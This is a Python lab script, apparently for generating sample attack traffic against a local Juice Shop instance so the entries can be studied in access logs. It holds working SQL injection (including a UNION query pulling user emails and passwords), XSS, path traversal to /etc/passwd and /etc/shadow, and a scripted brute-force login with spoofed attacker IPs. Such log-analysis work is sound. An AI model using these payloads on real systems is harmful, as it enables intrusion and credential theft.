"""Send ONE example of each attack to our own lab, so we can see how each
looks in access.log. Lab only (127.0.0.1). Never change BASE to another site."""
import requests

BASE = "http://127.0.0.1:8080"
BROWSER_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/155.0 Safari/537.36"


def session(ip, ua=BROWSER_UA):
    s = requests.Session()
    s.headers.update({"X-Forwarded-For": ip, "User-Agent": ua})
    return s


# 1) SQL injection on the search API (attacker 10.0.0.21)
s = session("10.0.0.21", "sqlmap/1.8")
s.get(BASE + "/rest/products/search", params={"q": "')) OR 1=1--"})
s.get(BASE + "/rest/products/search",
      params={"q": "')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--"})

# 2) XSS: the search API call the web page makes (attacker 10.0.0.22)
s = session("10.0.0.22")
s.get(BASE + "/rest/products/search", params={"q": "<script>alert(1)</script>"})
s.get(BASE + "/rest/products/search", params={"q": '<iframe src="javascript:alert(1)">'})

# 3) Path traversal (attacker 10.0.0.23)
s = session("10.0.0.23")
s.get(BASE + "/ftp/..%252F..%252F..%252Fetc%252Fpasswd")
s.get(BASE + "/ftp/..%252F..%252Fetc%252Fshadow")

# 4) Brute force login: 8 failures then one success (attacker 10.0.0.24)
s = session("10.0.0.24", "hydra")
for i in range(8):
    r = s.post(BASE + "/rest/user/login",
               json={"email": "admin@juice-sh.op", "password": f"wrong{i}"})
    print("login", i, r.status_code)
r = s.post(BASE + "/rest/user/login",
           json={"email": "admin@juice-sh.op", "password": "admin123"})
print("final login", r.status_code)